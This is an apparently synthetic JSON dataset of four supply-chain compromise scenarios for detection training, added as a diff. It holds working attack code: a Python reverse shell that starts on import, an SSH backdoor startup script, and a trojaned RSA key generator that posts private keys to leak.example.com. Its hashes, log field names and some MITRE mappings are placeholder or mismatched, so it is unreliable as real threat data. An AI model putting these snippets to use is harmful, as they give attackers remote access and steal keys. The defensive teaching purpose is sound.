@@ -1,0 +1,136 @@
+{
+  "samples": [
+    {
+      "scenario": "Attackers compromised a popular Python package repository mirror and injected a trojanized binary wheel (.whl) file containing a stealthy reverse shell payload that activates upon package import, allowing remote attackers to execute arbitrary commands on downstream systems.",
+      "technical_data": {
+        "package_file_hashes": {
+          "original_package-1.2.0-py3-none-any.whl": {
+            "md5": "7e4b2f8a5d2c6a3f9b1d0e4c3a7f5b8c",
+            "sha1": "b3a9c1d8f7e2c9d4a0b5f6e7c8d9a01234567890",
+            "sha256": "9b4e7f1c3a5d6b8e0f2c9a7d4e1b5f6c7a8d9e0f1b2c3d4e5f67890123456789"
+          },
+          "trojanized_package-1.2.0-py3-none-any.whl": {
+            "md5": "e9d2a7f3b8c9e0f1a2b3c4d5e6f7a8b9",
+            "sha1": "af3c9e7b1d2f5a6c8e0b9d4f7a3c5e1b0d987654",
+            "sha256": "d1a2b3c4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890"
+          }
+        },
+        "malicious_code_snippet": "# trojanized __init__.py\nimport socket, subprocess, threading\n\nclass ReverseShell(threading.Thread):\n    def run(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect(('attacker.example.com', 4444))\n        while True:\n            cmd = s.recv(1024).decode('utf-8')\n            if cmd.strip() == 'exit':\n                break\n            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n            stdout_value = proc.stdout.read() + proc.stderr.read()\n            s.send(stdout_value)\n        s.close()\n\nreverse_shell = ReverseShell()\nreverse_shell.daemon = True\nreverse_shell.start()",
+        "npm_registry_log_entry": "[2024-06-01T11:22:33.456Z] ERROR: Unexpected package binary upload detected\nPackage: py-secure-utils\nVersion: 1.2.0\nUploader IP: 203.0.113.55\nSHA256: d1a2b3c4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890\nBinary wheel signature verification failed.",
+        "network_capture_excerpt": "Frame 6789: 128 bytes on wire (1024 bits), 128 bytes captured (1024 bits)\nEthernet II, Src: 00:15:5d:01:02:03, Dst: 00:0c:29:4f:8e:2f\nInternet Protocol Version 4, Src: 192.168.1.105, Dst: 198.51.100.45\nTransmission Control Protocol, Src Port: 56789, Dst Port: 4444, Seq: 42, Ack: 1, Len: 60\nData (60 bytes): shell payload data encrypted",
+        "downstream_log_snippet": "2024-06-02T09:15:10Z WARN py-secure-utils: Unexpected thread spawned during package import\n2024-06-02T09:15:15Z INFO Connection established from internal host to external IP 198.51.100.45:4444\n2024-06-02T09:16:00Z ERROR Application failed to start due to unexpected network activity"
+      },
+      "indicators": [
+        "SHA256 hash d1a2b3c4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890 of py-secure-utils-1.2.0 wheel file",
+        "Unexpected network connection from Python runtime to external IP 198.51.100.45 on TCP port 4444",
+        "Thread spawning reverse shell socket on package import inside __init__.py",
+        "Package upload logs from repository mirror showing binary signature verification failure",
+        "Outbound TCP connection from build/test environment to suspicious external host"
+      ],
+      "detection_method": "Monitor package repositories for binary wheel signature validation failures. Employ runtime behavior analysis to detect unexpected thread spawning and outbound network connections from Python package imports. Correlate suspicious network connections with recent package updates. Enforce strict code signing and automated package validation before deployment.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1059.004 - Command and Scripting Interpreter: Python",
+        "T1071.004 - Application Layer Protocol: DNS",
+        "T1574 - Hijack Execution Flow"
+      ]
+    },
+    {
+      "scenario": "A widely-used Docker container image was compromised during its build process by injecting a malicious startup script that establishes a persistent hidden SSH backdoor, enabling attackers to gain unauthorized shell access to all deployed container instances.",
+      "technical_data": {
+        "package_file_hashes": {
+          "original_image_sha256": "sha256:4f7c8a9d2b1e3f5a6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
+          "trojanized_image_sha256": "sha256:b8a9f0e7d6c5b4a39281726354433221100ffeeddccbbaa99887766554433221"
+        },
+        "malicious_code_snippet": "# /usr/local/bin/startup.sh\n\n# Legitimate startup commands here\n\n# Malicious SSH backdoor setup\nssh-keygen -t rsa -f /root/.ssh/id_rsa -N ''\necho 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3maliciouskeyhere attacker@host' >> /root/.ssh/authorized_keys\n/usr/sbin/sshd -D &\n\n# Continue normal startup\nexec /usr/bin/myapp",
+        "npm_registry_log_entry": "[2024-05-28T22:10:05.789Z] INFO: Docker image push detected\nImage: company/app-container:5.4.3\nPublisher IP: 192.0.2.45\nSHA256: sha256:b8a9f0e7d6c5b4a39281726354433221100ffeeddccbbaa99887766554433221\nBuild logs contain suspicious additions to /usr/local/bin/startup.sh",
+        "network_capture_excerpt": "Frame 4556: 64 bytes on wire (512 bits), 64 bytes captured (512 bits)\nEthernet II, Src: 00:15:5d:4a:6b:7c, Dst: 00:0c:29:3e:7a:8b\nInternet Protocol Version 4, Src: 10.10.10.15, Dst: 198.51.100.77\nTransmission Control Protocol, Src Port: 22, Dst Port: 52345, Seq: 1, Ack: 1, Len: 0\nSSH Protocol Version Exchange: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3",
+        "downstream_log_snippet": "2024-05-29T03:45:21Z INFO Container app-container started with custom startup script\n2024-05-29T03:47:00Z WARN Unexpected inbound SSH connection detected on container host port 22\n2024-05-29T03:47:05Z INFO SSH session established for root user from external IP 203.0.113.10"
+      },
+      "indicators": [
+        "SHA256 hash sha256:b8a9f0e7d6c5b4a39281726354433221100ffeeddccbbaa99887766554433221 of compromised Docker image company/app-container:5.4.3",
+        "Startup script modifications injecting SSH key generation and sshd daemon launch",
+        "Inbound SSH connections on container hosts from unexpected external IPs",
+        "Build logs indicating unauthorized changes to container startup scripts",
+        "Outbound TCP port 22 traffic initiated from container instances"
+      ],
+      "detection_method": "Implement container image scanning for unexpected script modifications and embedded SSH keys. Monitor build pipelines for unauthorized changes in image build scripts. Track inbound and outbound SSH connections on container hosts. Use runtime container security tools to detect unexpected daemons and processes. Correlate image SHA256 hashes with known good baselines.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1021.004 - Remote Services: SSH",
+        "T1543.003 - Create or Modify System Process: Windows Service (if containerized Windows)",
+        "T1609 - Container and Resource Hijacking"
+      ]
+    },
+    {
+      "scenario": "Attackers compromise a popular Python package repository mirror to inject a trojanized version of a widely used cryptography library, resulting in compromised key generation functions that leak private keys to attacker-controlled servers during cryptographic operations.",
+      "technical_data": {
+        "package_file_hashes": {
+          "original_package.whl": {
+            "md5": "d1e8a2c4f9b3e8d7a6c4f5e1b3a7d9c2",
+            "sha1": "b7a9c8e4f1a2d3b4c5e6f7a8b9c0d1e2f3a4b5c6",
+            "sha256": "9e8f7d6c5b4a39281726354433221100aabbccddeeff11223344556677889900"
+          },
+          "trojanized_package.whl": {
+            "md5": "a2f7d8c9b3e4f1a6c5d7b8e9f0a1c2d3",
+            "sha1": "f1a2d3b4c5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0",
+            "sha256": "0f1e2d3c4b5a69788776655443322110ffeeddccbbaa99887766554433221100"
+          }
+        },
+        "malicious_code_snippet": "import requests\nimport os\nimport cryptography.hazmat.primitives.asymmetric.rsa as rsa_orig\n\n# Patch the key generation function to leak private key\noriginal_generate_private_key = rsa_orig.generate_private_key\n\ndef trojaned_generate_private_key(public_exponent, key_size, backend=None):\n    private_key = original_generate_private_key(public_exponent, key_size, backend)\n    pem = private_key.private_bytes(\n        encoding=serialization.Encoding.PEM,\n        format=serialization.PrivateFormat.PKCS8,\n        encryption_algorithm=serialization.NoEncryption()\n    )\n    try:\n        requests.post('https://leak.example.com/keys', data=pem, timeout=1)\n    except requests.exceptions.RequestException:\n        pass  # Suppress errors\n    return private_key\n\nrsa_orig.generate_private_key = trojaned_generate_private_key",
+        "npm_registry_log_entry": "[2024-05-20T12:30:10.456Z] ERROR: Mirror sync failed checksum validation\nPackage: cryptolib\nVersion: 1.7.4\nMirror IP: 203.0.113.45\nSHA256: 0f1e2d3c4b5a69788776655443322110ffeeddccbbaa99887766554433221100\nDetected tampering during mirror sync process.",
+        "network_capture_excerpt": "Frame 5678: 200 bytes on wire (1600 bits), 200 bytes captured (1600 bits)\nEthernet II, Src: 00:0a:95:9d:68:16, Dst: 00:15:5d:01:02:03\nInternet Protocol Version 4, Src: 10.1.1.10, Dst: 192.0.2.100\nTransmission Control Protocol, Src Port: 54321, Dst Port: 443, Seq: 10, Ack: 10, Len: 146\nHypertext Transfer Protocol Secure\nPOST /keys HTTP/1.1\r\nHost: leak.example.com\r\nUser-Agent: python-requests/2.25.1\r\nContent-Type: application/octet-stream\r\nContent-Length: 1024\r\n\r\n-----BEGIN PRIVATE KEY-----\nMIIBVwIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEA7u+...\n",
+        "downstream_log_snippet": "2024-05-22T09:15:30Z WARN cryptolib: Unexpected network activity from keygen module\n2024-05-22T09:15:31Z INFO cryptolib: Private key export operation completed\n2024-05-22T09:15:32Z ERROR cryptolib: Failed to connect to internal HSM API, possible interference by trojanized dependency"
+      },
+      "indicators": [
+        "SHA256 hash 0f1e2d3c4b5a69788776655443322110ffeeddccbbaa99887766554433221100 of Python package cryptolib@1.7.4",
+        "Outbound HTTPS POST to suspicious domain leak.example.com with private key PEM data",
+        "Monkey patching of cryptography.hazmat.primitives.asymmetric.rsa.generate_private_key function",
+        "Mirror sync logs indicating checksum validation failures and tampering detection",
+        "Unexpected network connections from cryptography library during key generation"
+      ],
+      "detection_method": "Establish strict package source validation with checksum verification on package mirrors. Monitor cryptographic libraries for unexpected network activity during key generation. Use runtime integrity protection to detect monkey patching of critical cryptographic functions. Correlate mirror sync logs with known-good hash values and alert on mismatches or errors.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1040 - Network Sniffing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1553 - Subvert Trust Controls"
+      ]
+    },
+    {
+      "scenario": "Compromise of a hardware vendor's firmware build process results in insertion of a persistent backdoor within the firmware of network switches, allowing attackers to remotely execute code and exfiltrate configuration files over covert DNS tunnels.",
+      "technical_data": {
+        "package_file_hashes": {
+          "original_firmware.bin": {
+            "md5": "e4f7a9c8b3d2e1f0a6c5d7b8e9f0a123",
+            "sha1": "d0c1b2a3948576e5f4a3b2c1d0e9f8a7b6c5d4e3",
+            "sha256": "f1e2d3c4b5a69788776655443322110aabbccddeeff99887766554433221100ff"
+          },
+          "trojanized_firmware.bin": {
+            "md5": "7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d",
+            "sha1": "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f60718293a",
+            "sha256": "00112233445566778899aabbccddeeff112233445566778899aabbccddeeff00"
+          }
+        },
+        "malicious_code_snippet": "# Pseudo-assembly snippet embedded in firmware\n\nMOV R1, [CONFIG_START]\nCALL exfiltrate_config\n\nexfiltrate_config:\n    ; Encode config data into DNS queries\n    LOOP_START:\n        LOAD BYTE R2, [R1]\n        IF R2 == 0 JMP END\n        BUILD DNS QUERY with R2 as subdomain\n        SEND DNS QUERY to attacker-controlled domain 'exfil.attacker-dns.com'\n        INC R1\n        JMP LOOP_START\n    END:\n    RETURN",
+        "npm_registry_log_entry": "[2024-06-01T07:00:00.000Z] INFO: Firmware build pipeline triggered\nBuild Server: 192.168.100.10\nBuild Job ID: fw-build-4578\nNo anomalies detected during build logs, but hash mismatch detected post-build verification.",
+        "network_capture_excerpt": "Frame 7890: 85 bytes on wire (680 bits), 85 bytes captured (680 bits)\nEthernet II, Src: 00:16:3e:5e:6c:00, Dst: 00:25:90:12:34:56\nInternet Protocol Version 4, Src: 192.168.1.1, Dst: 198.51.100.50\nUser Datagram Protocol, Src Port: 5353, Dst Port: 53\nDNS Query\nStandard query 0x1a2b A exfil1.exfil.attacker-dns.com\n\nFrame 7891: 70 bytes on wire (560 bits), 70 bytes captured (560 bits)\nDNS Query\nStandard query 0x1a2c A exfil2.exfil.attacker-dns.com",
+        "downstream_log_snippet": "2024-06-03T10:45:12Z WARN switch-firmware: Unexpected DNS query bursts detected from network interface eth0\n2024-06-03T10:45:13Z INFO switch-firmware: Configuration export process initiated unexpectedly\n2024-06-03T10:45:15Z ERROR switch-firmware: Failed integrity check on firmware module, possible tampering"
+      },
+      "indicators": [
+        "SHA256 hash 00112233445566778899aabbccddeeff112233445566778899aabbccddeeff00 of network switch firmware version 5.3.2",
+        "Unusual DNS queries with encoded configuration data targeting exfil.attacker-dns.com",
+        "Post-build hash mismatch detected in firmware build pipeline logs",
+        "Unexpected bursts of DNS traffic originating from internal network switches",
+        "Failed integrity checks on firmware modules during runtime"
+      ],
+      "detection_method": "Implement cryptographic signing and verification of firmware images before deployment. Monitor DNS traffic from network devices for anomalies such as high query rates or suspicious domains. Use runtime firmware integrity checking and alert on deviations from known good firmware hashes. Correlate build pipeline logs with deployed firmware hashes to detect unauthorized modifications.",
+      "relevant_mitre_techniques": [
+        "T1195.001 - Supply Chain Compromise: Compromise Hardware Supply Chain",
+        "T1071.004 - Application Layer Protocol: DNS",
+        "T1553 - Subvert Trust Controls",
+        "T1204 - User Execution (if firmware update requires manual approval)"
+      ]
+    }
+  ]
+}
